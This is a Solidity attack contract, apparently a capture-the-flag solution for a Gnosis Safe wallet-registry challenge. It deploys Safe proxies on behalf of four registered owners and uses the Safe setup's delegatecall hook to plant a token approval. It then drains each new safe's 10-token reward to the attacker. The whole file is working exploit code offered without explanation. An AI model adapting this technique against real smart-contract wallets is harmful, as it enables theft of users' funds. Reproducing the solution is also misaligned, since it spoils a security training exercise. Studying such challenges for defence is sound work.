// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletRegistryAttack {
    address public singleton;
    address public walletRegistry;
    address public owner;
    IERC20 public token;
    GnosisSafeProxyFactory public factory;

    constructor(
        address singletonAddress,
        address walletRegistryAddress,
        address tokenAddress,
        address factoryAddress
    ) {
        singleton = singletonAddress;
        walletRegistry = walletRegistryAddress;
        token = IERC20(tokenAddress);
        owner = msg.sender;
        factory = GnosisSafeProxyFactory(factoryAddress);
    }

    function approve(address _token, address _spender) public {
        IERC20(_token).approve(_spender, 10 ether);
    }

    function attack(address[] memory _owners) public {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory _owner = new address[](1);
            _owner[0] = _owners[i];

            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                _owner,
                1,
                address(this),
                abi.encodeWithSignature(
                    "approve(address,address)",
                    address(token),
                    address(this)
                ),
                address(0),
                0,
                0,
                0
            );

            GnosisSafeProxy _result = factory.createProxyWithCallback(
                singleton,
                _initializer,
                i,
                IProxyCreationCallback(walletRegistry)
            );

            token.transferFrom(address(_result), owner, 10 ether);
        }
    }
}
